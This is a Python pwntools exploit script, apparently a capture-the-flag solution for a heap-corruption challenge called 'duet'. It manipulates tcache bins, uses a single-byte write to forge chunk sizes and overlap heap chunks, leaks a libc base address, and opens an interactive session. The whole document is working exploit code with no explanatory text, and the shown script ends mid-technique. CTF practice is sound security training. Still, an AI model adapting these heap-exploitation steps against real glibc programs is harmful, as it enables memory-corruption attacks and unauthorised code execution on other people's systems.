from pwn import *

e = ELF("./duet")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("", )
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

def alloc(idx, size, data="AAAA"):
  data = data.ljust(size, "\x00")
  
  instr = "\xe7\x90\xb4"
  if idx == 1:
    instr = "\xe7\x91\x9f"

  p.sendline("1")

  p.sendlineafter("Instrument:", instr)
  p.sendlineafter("Duration:", str(size))
  p.sendafter("Score:", data)

  p.recvuntil(":")

def free(idx):
  instr = "\xe7\x90\xb4"
  if idx == 1:
    instr = "\xe7\x91\x9f"

  p.sendline("2")
  p.sendlineafter("Instrument:", instr)

  p.recvuntil(":")

def magic(byte):
  p.sendline("5")
  p.sendlineafter(":", str(byte))

  p.recvuntil(":")

def show(idx):
  instr = "\xe7\x90\xb4"
  if idx == 1:
    instr = "\xe7\x91\x9f"

  p.sendline("3")
  p.sendlineafter("Instrument:", instr)


for i in range(7):
  alloc(0, 0x88)
  free(0)
  alloc(0, 0xa8)
  free(0)
  alloc(0, 0xd8)
  free(0)
  alloc(0, 0xe8)
  free(0)
  alloc(0, 0xf8)
  free(0)

alloc(0, 0x88)
alloc(1, 0x88)
free(0)

magic(0xf1)

alloc(0, 0x400, ("A" * 0x58 + p64(0x11) + p64(0) + p64(0x11)).ljust(0xe0 - 8, "\x00") + p64(0x11) + p64(0) + p64(0x11) + p64(0) + p64(0x11) + p64(0) + p64(0x11))

free(1)

alloc(1, 0xe8, "A" * 0x88 + p64(0xe1))

free(0)

show(1)

p.recvuntil(p64(0xe1))

leak = u64(p.recv(8)) + 0x00007f31501db000 - 0x7f31503bfca0
print(hex(leak))

p.recvuntil("Shang")
p.recvuntil(":")


debug()
alloc(0, 0xd8 - 0x20, ("A" * 0x58 + p64(0x11) + p64(0) + p64(0x11)).ljust(0xd8 - 0x20 - 0x10, "\x00") + p64(0x11))

free(1)
alloc(1, 0xe8, "A" * 0x88 + p64(0xe1 - 0x30))

free(0)

alloc(0, 0xa8 - 0x20, "A" * 0x58 + p64(0x11) + p64(0) + p64(0x11))
free(1)

alloc(1, 0xe8, "A" * 0x88 + p64(0x101))


p.interactive()
